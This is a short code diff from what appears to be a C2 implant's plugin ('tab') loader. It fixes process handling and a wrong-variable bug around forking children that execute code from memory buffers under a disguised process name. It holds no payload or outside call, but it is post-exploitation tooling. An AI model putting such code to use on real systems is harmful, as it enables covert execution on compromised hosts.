@@ -30,6 +30,9 @@
 #include <fcntl.h>
 #include <signal.h>
 
+#include <sys/types.h>
+#include <sys/wait.h>
+
 #include <tab.h>
 #include <c2.h>
 #include <log.h>
@@ -69,7 +72,7 @@ static int create_tab(tabs_t *tab, unsigned char *buffer, int size)
         argv[0] = "m4r1n4";
 
         #ifdef LINUX
-            pawn_exec_fd(buffer, argv, environ);
+            pawn_exec(buffer, argv, environ);
         #else
         #ifdef MACOS
             pawn_exec_bundle(buffer, argv, environ);
@@ -77,6 +80,7 @@ static int create_tab(tabs_t *tab, unsigned char *buffer, int size)
         #endif
 
         free(frame);
+        exit(EXIT_SUCCESS);
     }
     else
     {
@@ -135,7 +139,7 @@ int tab_add(tabs_t **tabs, int id, unsigned char *buffer, int size)
         {
             tab_new->id = id;
 
-            if (create_tab(tab, buffer, size) < 0)
+            if (create_tab(tab_new, buffer, size) < 0)
             {
                 free(tab_new);
                 return -1;
@@ -153,24 +157,31 @@ int tab_add(tabs_t **tabs, int id, unsigned char *buffer, int size)
 
 int tab_exit(tabs_t *tab)
 {
+    pid_t pid;
+    int status;
     tlv_pkt_t *tlv_pkt;
 
     tlv_pkt = tlv_pkt_create();
 
     if (tlv_pkt_add_int(tlv_pkt, TLV_TYPE_TAG, TAB_TERM) < 0)
-    {
-        tlv_pkt_destroy(tlv_pkt);
-        return -1;
-    }
+        goto fail;
 
     if (tlv_pkt_write(tab->fd, tlv_pkt) < 0)
+        goto fail;
+
+    do
     {
-        tlv_pkt_destroy(tlv_pkt);
-        return -1;
-    }
+        pid = waitpid(tab->pid, &status, 0);
+        if (pid == -1)
+            break;
+    } while (!WIFEXITED(status) && !WIFSIGNALED(status));
 
     close(tab->fd);
     return 0;
+
+fail:
+    tlv_pkt_destroy(tlv_pkt);
+    return -1;
 }
 
 int tab_delete(tabs_t **tabs, int id)
